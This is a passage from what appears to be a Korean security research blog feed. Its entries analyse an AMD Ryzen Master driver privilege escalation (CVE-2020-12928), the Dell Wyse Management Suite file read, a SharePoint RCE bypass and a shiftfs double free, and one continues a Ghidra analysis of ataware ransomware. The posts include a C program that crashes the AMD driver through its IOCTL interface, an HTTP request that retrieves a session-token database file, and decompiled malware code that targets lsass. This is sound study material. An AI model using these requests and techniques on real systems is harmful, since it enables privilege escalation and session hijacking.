할당합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_replace</code> 함수에서 <code>memdup_user</code>가 할당에 성공하고 <code>copy_to_user</code>는 실패하면 <code>shiftfs_btrfs_ioctl_fd_restore</code>에서 <code>kfree</code>를 호출하여 첫 번째 free를 진행하고 <code>shiftfs_real_ioctl</code>에서 다시 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 Potential leak과 <code>kfree</code>를 통한 두 번째 free가 가능하여 double free bug가 발생합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>double free bug</tag>
      
      <tag>idioth</tag>
      
      <tag>ubuntu</tag>
      
      <tag>driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master 분석(1)</title>
    <link href="/2021/07/14/l0ch/windows-driver-part2/"/>
    <url>/2021/07/14/l0ch/windows-driver-part2/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! 한 달 만에 돌아온 윈도우 드라이버 시리즈입니다. 지난번 커널 디버깅 세팅에 이어 본격적으로 윈도우 third-party 드라이버 원데이를 분석해볼 건데요, 이제 보니까 시리즈 제목을 뭐같이 짓긴 했네요. 내가 왜 저랬을까..? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled.png" alt="windows-driver-part2/Untitled.png"></p><blockquote><p>다음 파트는 공대 “아저씨”가 알려주는 드라이버 취약점으로 돌아오겠습니다…</p></blockquote><h1 id="AMD-Ryzen-Master"><a href="#AMD-Ryzen-Master" class="headerlink" title="AMD Ryzen Master"></a>AMD Ryzen Master</h1><p><img src="/2021/07/14/l0ch/windows-driver-part2/AMD.png" alt="windows-driver-part2/AMD.png"></p><p>오늘 분석할 AMD Ryzen Master는 라이젠 CPU를 사용하시는 분들 중 오버클럭에 관심이 있다면 들어보셨을 익숙한 유틸리티입니다! 저도 작년에 라이젠 CPU를 처음 사서 인생 첫 오버클럭을 하려고 했는데, 바이오스 메뉴에서 뭘 어떻게 해야 할지 몰라서 얼타다가 마우스 클릭 몇 번에 오버클럭이 짠 하고 된다길래 유용하게 썼었죠. 물론 재부팅할 때마다 설정 적용해줘야 하는 게 귀찮아서 결국 바이오스에서 설정했습니다 ㅋㅋ!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%201.png" alt="windows-driver-part2/Untitled%201.png"></p><blockquote><p>오버클럭도 못하는 컴알못ㅜ</p></blockquote><p>이건 여담인데, 지금 쓰는 CPU가 오버클럭 안한 순정상태에서는 블루스크린 뜨는데 오버클럭 하면 멀쩡하더라구요. 수율이 좋길래 그냥 쓰고 있는데.. 뭔가 찝찝한 건 기분 탓일 거야 아마</p><blockquote><p>본인(새컴 맞춰서 신남) : 님들 시퓨 순정은 블루스크린 뜨는데 오버클럭 하면 잘 돌아감 ㅋㅋ 신기하죠<br>??? : 우린 그걸 초기 불량이라고 부르기로 했어요.</p></blockquote><p>…? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%202.png" alt="windows-driver-part2/Untitled%202.png"></p><blockquote><p>그래도 1년째 잘 쓰고 있습니다..</p></blockquote><p>아무튼 오늘은 작년에 공개된 AMD Ryzen Master의 권한상승 취약점 CVE-2020-12928 을 분석해보도록 하겠습니다! OS환경은 Windows 10 빌드 19043.1083에서, 타겟인 AMD Ryzen Master는 취약한 AMDRyzenMasterDriverV15 버전의 드라이버가 포함된  2.1.1.1472 버전에서 진행했습니다. </p><p>구버전 찾는데 하루 종일 걸려버림 ㅎㅎ. .</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%203.png" alt="windows-driver-part2/Untitled%203.png"></p><blockquote><p>아 구버전 구하기 진짜 너무 어려웠다 ㅁㄴㅇㄹㄴㅇㅁㄹㅇㅁ</p></blockquote><p>이제.. 설치하고 설치 경로를 찾아가보면</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip.png" alt="windows-driver-part2/tempsnip.png"></p><p>오늘의 주인공 드라이버는 위 경로에서 찾을 수 있습니다.</p><h1 id="Kernel-Driver-Driver-Exploit"><a href="#Kernel-Driver-Driver-Exploit" class="headerlink" title="Kernel Driver / Driver Exploit"></a>Kernel Driver / Driver Exploit</h1><p>본격적으로 분석을 하기 전에 드라이버가 어떤 것인지, 취약점에는 어떤 것이 있는지부터 알아봐야 합니다.</p><p>Windows Kernel은 모듈화가 되어 있으며 Core Kernel(Microkernel)과 Device Driver 두 가지로 나눌 수 있습니다. Core 모듈에는 Kernel의 핵심적인 기능이 구현되어 있고 대부분의 커널 기능은 driver 형태로 모듈화 되어 구현됩니다. 이러한 모듈화의 장점은 확장성과 유지보수가 용이하다는 점이 있겠네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%204.png" alt="windows-driver-part2/Untitled%204.png"></p><blockquote><p>Windows NT 계열의 커널 아키텍처</p></blockquote><p>Windows에서 드라이버는 특정 이벤트가 발생할 때 커널 컨텍스트에서 실행되는 코드를 포함하는 모듈로 정의할 수 있습니다. 정리하면 커널 권한이 필요한 작업이 필요할 때 실행되는 코드를 모듈화 한 것입니다.  </p><p>위 사진에서 볼 수 있듯이 Windows는 User mode와 Kernel mode로 권한이 나뉘어 있습니다. User mode에서 실행되는 어플리케이션이 커널 권한이 필요한 작업을 요구할 때 커널 권한에 직접적으로 접근하는 것이 아닌 커널 권한으로 실행되는 드라이버에게 요청을 보내 간접적으로 수행하는 것이죠. 이때 User mode 어플리케이션은 I/O Manger를 통해 드라이버에게 요청을 보내는데, IOCTL(I/O Control) 코드로 드라이버가 어떤 기능을 수행할지를 결정합니다.</p><p>그렇다면, 이런 드라이버에서 찾을 수 있는 취약점은 어떤 것이 있을지 감이 오지 않나요?</p><p>드라이버의 취약점 공격에 성공하면 유저 권한의 어플리케이션으로는 할 수 없는 높은 권한에서의 임의 명령어 실행이 가능하고 타겟에게 더 큰 피해를 끼칠 수 있습니다. 이를 권한 상승 취약점(Privilege Escalation)이라고 부릅니다.</p><p>그런데 Microsoft가 바보도 아니고 커널 권한으로 돌아가는 드라이버는 좀 더 보안에 신경을 써서 개발했을 거 같지 않나요? 문제는 이 드라이버는 MS가 아닌 제삼자(third-party)도 개발하고 배포할 수 있어 발생합니다. </p><p>third-party driver는 보통 커널 레벨의 높은 권한을 요구하는 백신이나 하드웨어를 직접 제어하는 마우스, 모니터 드라이버, 하드웨어 모니터링 등의 제조사 유틸리티에서 많이 사용합니다. Microsoft가 Windows 커널과 자기네 드라이버를 아무리 심혈을 기울여 버그 없이 내놓는다고 해도 이런 third-party driver들이 있는 한 권한 상승 취약점은 팡팡 터질 것 같네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%205.png" alt="windows-driver-part2/Untitled%205.png"></p><blockquote><p>요즘 핫한 PrintNightmare같은 프린터 스풀러 취약점이 터지는 거 보면 마소도 뭐.. 갈 길이 먼 것 같지만요 ㅎㅎ;;</p></blockquote><p>오늘 글을 보기 전 드라이버 익스플로잇에 대한 아래 번역글을 읽어보면 도움이 됩니다!</p><p><a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">[Translation] Exploiting System Mechanic Driver Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/04/28/l0ch/exploiting-driver-part2/">[Translation] Exploiting System Mechanic Driver Part 2</a></p><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>이제 본격적으로 취약점을 분석해볼 차례입니다! 먼저 드라이버 서비스가 동작중인지 확인부터 해보겠습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/2.png" alt="windows-driver-part2/2.png"></p><p>WinObj로 확인해보면 AMDRyzenMasterDriverV15 디바이스가 올라온 것을 볼 수 있네요. </p><p><code>AMDRyzenMasterDriverV15.sys</code> 를 IDA로 열자마자 바로 <code>DriverEntry</code> 부터 찾아보죠</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%206.png" alt="windows-driver-part2/Untitled%206.png"></p><p><code>sub_140008A5C</code>로 가볼까요?</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip%201.png" alt="windows-driver-part2/tempsnip%201.png"></p><p><code>DriverEntry</code>에서 첫 번째 매개변수로 <code>PDRIVER_OBJECT</code> 를 줬으니 매개변수 <code>a1</code>의 type을 <code>PDRIVER_OBJECT</code>로 변환합니다. 여기선 dispatch routine을 찾을 수 없네요.  <code>PDRIVER_OBJECT</code>를 매개변수로 전달하는 함수를 더 찾아보겠습니다. <code>sub_1400046AC</code>를 볼까요? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip2.png" alt="windows-driver-part2/tempsnip2.png"></p><p>이번에는 <code>DRIVER_OBJECT-&gt;MajorFunction[14]</code>에 dispatch routine을 할당하는 코드를 찾을 수 있습니다! 장치명도 보이네요. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%207.png" alt="windows-driver-part2/Untitled%207.png"></p><p>dispatch routine에는 IOCTL 코드와 코드 별 루틴을 볼 수 있습니다.</p><h2 id="MmMapIoSpace"><a href="#MmMapIoSpace" class="headerlink" title="MmMapIoSpace"></a>MmMapIoSpace</h2><p>이제 함수 하나를 중점적으로 보면서 취약점을 찾아볼 텐데요, 타겟은 <code>MmMapIoSpace</code>로 정하겠습니다! <code>MmMapIoSpace</code>는 물리 주소를 가상 페이지 주소에 매핑하는 함수로, 함수 원형은 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">MmMapIoSpace</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  PHYSICAL_ADDRESS    PhysicalAddress,  <span class="hljs-comment">// 매핑할 물리적 주소</span></span></span><span class="hljs-function"><span class="hljs-params">  SIZE_T              NumberOfBytes,   <span class="hljs-comment">//매핑할 바이트 수</span></span></span><span class="hljs-function"><span class="hljs-params">  MEMORY_CACHING_TYPE CacheType       <span class="hljs-comment">//매핑하는 데 사용할 캐시 속성을 나타내는 MEMORY_CACHING_TYPE 값</span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>왠지 이 함수 매개변수를 제어할 수 있으면 아주 좋은 공격 벡터가 될 것 같죠? </p><p><code>MmMapIoSpace</code> 관련 취약점은 MSI Dragon Center 권한상승을 다루는 하루한줄(<a href="https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/">CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</a>) 에서도 언급된 적이 있었습니다. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%208.png" alt="windows-driver-part2/Untitled%208.png"></p><blockquote><p>이때 오늘 글 예고를 하기도 했었죠 ㅎㅎ</p></blockquote><p><img src="/2021/07/14/l0ch/windows-driver-part2/33.png" alt="windows-driver-part2/33.png"></p><p>cross reference view로 본 <code>MmMapIoSpace</code>를 호출하는 함수 리스트입니다. <code>sub_140007278</code> 함수를 보도록 할게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%209.png" alt="windows-driver-part2/Untitled%209.png"></p><p>코드를 보고 분석해보면 간단하게 다음과 같이 정리가 가능합니다.</p><ul><li><code>MmMapIoSpace</code> 함수에 매개변수 <code>a1</code>와 <code>a2</code>를 각각 매핑하길 원하는 물리 주소와 길이를 전달합니다.</li><li><code>BaseAddress</code>에는 <code>MmMapIoSpace</code>의 반환 값인 물리 주소가 매핑된 가상 페이지 주소가 들어갑니다.</li><li><code>BaseAddress</code>가 NULL인지 확인하고 아니면 <code>NumberOfBytes</code>만큼 <code>a3</code> 버퍼의 값을 복사합니다.</li><li>복사가 완료되면 매핑된 주소를 매핑 해제하고 정상적으로 종료됩니다.</li></ul><p>해당 함수는 커널 메모리에 바이트 단위로 무언가를 쓰는 루틴으로 보입니다. 함수를 호출하는 dispatch routine으로 올라가 볼게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2010.png" alt="windows-driver-part2/Untitled%2010.png"></p><p>IOCTL 코드가 <code>0x81112F0C</code>일때 함수를 호출하네요. </p><p><code>MmMapIoSpace</code>를 호출하는 다른 함수인 <code>sub_1400063D0</code>을 보겠습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2011.png" alt="windows-driver-part2/Untitled%2011.png"></p><p>위 함수는 비슷해 보이긴 하지만 한 가지가 다르네요?  <code>sub_140007278</code> 함수와 반대로 커널 메모리를 바이트 단위로 쓰는 루틴인 것 같습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2012.png" alt="windows-driver-part2/Untitled%2012.png"></p><p>IOCTL <code>0x81112F08</code>일 때 해당 함수 루틴을 수행합니다.</p><p>위 두 함수의 <code>MmMapIoSpace</code> 로 전달되는 매개변수와 복사할 메모리 주소를 제어할 수 있으면 임의 쓰기 및 임의 읽기가 가능할 것 같다는 느낌적인 느낌이 오지 않나요?! 바로 테스트를 해볼게요.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    HANDLE dHandle;    WCHAR DeviceLink[] = <span class="hljs-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span>;    DWORD dwRet = <span class="hljs-number">0</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>,        <span class="hljs-number">0x100c</span>,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE);    dHandle = CreateFileW(        DeviceLink,        GENERIC_READ | GENERIC_WRITE,        <span class="hljs-number">0</span>,        <span class="hljs-literal">NULL</span>,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL,        <span class="hljs-literal">NULL</span>    );    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail! : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;        BYTE input_buff[<span class="hljs-number">0x100</span>] = &#123; <span class="hljs-number">0</span>, &#125;;    <span class="hljs-keyword">if</span> (!DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeviceIOControl Fail : 0x%X \n&quot;</span>, GetLastError());        CloseHandle(dHandle);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>위 코드에 대해서는 다음 파트에서 자세하게 설명하기로 하고, 지금은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">DeviceIoControl</a> 를 호출하는 부분만 보면 됩니다.</p><pre><code class="hljs c">DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>)</code></pre><p>IOCTL code <code>0x81112F0C</code> 로 요청을 보내는데 input buffer와 output buffer를 사이즈와 함께 전달합니다. 여기서는 input buffer 내용을 모두 NULL로 채워서 전달했습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/BSOD.png" alt="windows-driver-part2/BSOD.png"></p><blockquote><p>블루스크린 겟!  : )</p></blockquote><p>다음 파트에서는 파트 1의 커널 디버깅으로 크래시를 동적 분석한 뒤 익스플로잇까지 해보도록 하겠습니다. 다음에 만나요 안녕!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>third-party driver exploitation</tag>
      
      <tag>amd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21586/21587: Dell Wyse Management Suite Arbitrary File Read</title>
    <link href="/2021/07/13/l0ch/2021-07-13/"/>
    <url>/2021/07/13/l0ch/2021-07-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2021/07/06/technical-advisory-arbitrary-file-read-in-dell-wyse-management-suite-cve-2021-21586-cve-2021-21587/">Technical Advisory – Arbitrary File Read in Dell Wyse Management Suite (CVE-2021-21586, CVE-2021-21587)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Wyse Management Suit &lt; 3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell의 클라우드 엔드포인트 관리 솔루션인 Wyse Management Suite(WMS)에서 데이터베이스 파일을 포함한 Arbitrary File Read 취약점의 세부 정보가 공개되었습니다.</p><p>WMS의 <code>/ccm-web/image/os</code> 는 <code>filePath</code>와 <code>fileName</code> 매개변수를 받아 시스템 경로에서 파일을 검색합니다. 장치 ID를 사용해 유효하지 않은 요청을 보내면 다음과 같이 오류 메세지를 반환합니다.</p><pre><code class="hljs c">PUT /ccm-web/image/pull/a/b HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span>-HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> Cache-Control: <span class="hljs-keyword">private</span>Expires: Thu, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT...C:\Program Files\DELL\Software\repository\imagePull\staging\a\b (The system cannot find the path specified)</code></pre><p>오류 메세지에서 WMS가 설치된 시스템의 경로가 노출되며 아래와 같이 세션 토큰이 있는 MySQL 데이터베이스 테이블인 <code>[PATH]\DELL\WMS\Database\SQL\stratus\persistentlogin.ibd</code> 파일에서 JSESSIONID 값을 추출할 수 있고 이는 세션 하이재킹으로 이어질 수 있습니다.</p><pre><code class="hljs c">GET /ccm-web/image/os?filePath=C:\Program Files\DELL\WMS\Database\SQL\stratus&amp;fileName=persistentlogin.ibd HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span></code></pre><p>해당 취약점을 악용하면 관리 인터페이스의 BIOS 패스워드 재설정 및 VNC를 통한 원격 터미널 등의 기능에 액세스할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>dell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28474: SharePoint Interpretation conflict RCE</title>
    <link href="/2021/07/12/fabu1ous/2021-07-12/"/>
    <url>/2021/07/12/fabu1ous/2021-07-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-28474-sharepoint-remote-code-execution-via-server-side-control-interpretation-conflict">CVE-2021-28474: SHAREPOINT REMOTE CODE EXECUTION VIA SERVER-SIDE CONTROL INTERPRETATION CONFLICT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft SharePoint Server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft SharPoint Server에서 발생하는 원격 코드 실행 취약점이 패치되어 write-up이 공개되었습니다. 보안 확인에 사용되는 코드와 실제로 사용자 입력을 처리하는 코드 간의 불일치로 발생하는 취약점입니다. 인증된 SharePoint 사용자는 해당 취약점을 악용해 임의의 .NET 코드를 실행 할 수 있습니다.</p><p><code>EditingPageParser.VerifyControlOnSafeList()</code> 함수는 server-side control(<code>runat=&quot;server&quot;</code> attribute가 있는 tag)에 해당하는 input을 파싱해 해쉬 테이블을 만들고 그 값들을 <code>web.config</code> 파일과 비교하여 안전한 control 인지 확인합니다.</p><p>문제는 control을 처리할 땐 파서가 attribute를 HTML-decode 하지만, verification 작업에선 HTML-decode를 하지 않습니다. 따라서 <code>runat=&quot;&amp;#115;erver&quot;</code>와 같은 ASPX tag attribute를 사용하면 verification 시 server-side control로 인식되지 않아 bypass 할 수 있습니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>conflict</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</title>
    <link href="/2021/07/11/idioth/ghidra_part5/"/>
    <url>/2021/07/11/idioth/ghidra_part5/</url>
    
    <content type="html"><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2) (Here!)</p><hr><p>안녕하세요. idioth입니다. 여러모로 일정이 딜레이가 되어서 이번 파트를 작성하는데 꽤 오랜 시간이 걸렸네요. 이번 게시글에서는 ataware 랜섬웨어의 ATAPIConfiguration 부분에 대해 분석할 예정이에요. 세 개의 바이너리 (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)를 분석한다고 하였지만, 사용하는 기능 자체가 크게 다르지 않고 악성코드 분석에 치중되는 것 같아 이번 파트를 마지막으로 ghidra 시리즈는 완료될 예정입니다.</p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>저번 게시글에서 ATAPIinit 바이너리가 <code>dropboxusercontent</code> 링크에 접속하여 ATAPIConfiguration을 다운로드하는 것을 확인했습니다. 해당 링크는 현재 비활성화되어 있으므로 바이너리는 <a href="https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6">app.any.run</a>에서 구할 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled.png"></p><p>Detect It Easy로 확인한 결과 저번과 동일하게 mingw gcc로 컴파일이 된 파일임을 알 수 있습니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%201.png"></p><p>이번에는 저번과 달리 크게 눈에 띄는 문자열은 없지만, <code>wininet.dll</code>, <code>berylia.net</code>, <code>Wlsass.exe</code> 문자열을 보고 유추해볼 때, 해당 링크에 network 접속을 하여 <code>Wlsass.exe</code> 파일을 다운로드하는 것으로 추정할 수 있겠네요.</p><h1 id="Ghidra를-통한-기초-정적-분석"><a href="#Ghidra를-통한-기초-정적-분석" class="headerlink" title="Ghidra를 통한 기초 정적 분석"></a>Ghidra를 통한 기초 정적 분석</h1><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%202.png"></p><p>벌써 마지막 파트까지 도달했으니 이제 바이너리 정도는 가뿐하게 열고 analyze를 하실 수 있겠죠? ATAPIConfiguration을 추가해준 후 analyze까지 해줍니다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE pHVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  undefined4 local_2c4 [<span class="hljs-number">2</span>];  undefined4 local_2bc;  <span class="hljs-keyword">wchar_t</span> awStack672 [<span class="hljs-number">260</span>];  SIZE_T local_98;  undefined local_94 [<span class="hljs-number">16</span>];  undefined4 local_84 [<span class="hljs-number">17</span>];  LPVOID local_40;  <span class="hljs-keyword">int</span> local_3c [<span class="hljs-number">2</span>];  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  FARPROC local_28;  DWORD local_24;  FARPROC local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  undefined4 local_10;    local_3c[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_14 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  local_18 = (*local_14)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  local_2c4[<span class="hljs-number">0</span>] = <span class="hljs-number">0x22c</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_1c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_20 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  iVar3 = (*local_1c)(local_18,local_2c4);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(awStack672,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      local_10 = local_2bc;    &#125;    iVar3 = (*local_20)(local_18,local_2c4);  &#125; <span class="hljs-keyword">while</span> (iVar3 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    local_28 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    local_3c[<span class="hljs-number">0</span>] = (*local_28)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,local_10);    <span class="hljs-keyword">if</span> (local_3c[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_2c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_30 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*local_2c)(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*local_2c)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*local_30)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,local_3c,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);      local_84[<span class="hljs-number">0</span>] = <span class="hljs-number">0x48</span>;      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_34 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      iVar3 = (*local_34)(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,local_84,local_94);      <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>이번 바이너리에서 중점적으로 분석할 부분은 <code>FUN_00401cb7</code>입니다. 역시… 처음 열었을 때는 보기가 상당히 불편하네요. 이 변수가 어떤 건지도 모르겠고~ 저번 시간과 같이 보기 편하게 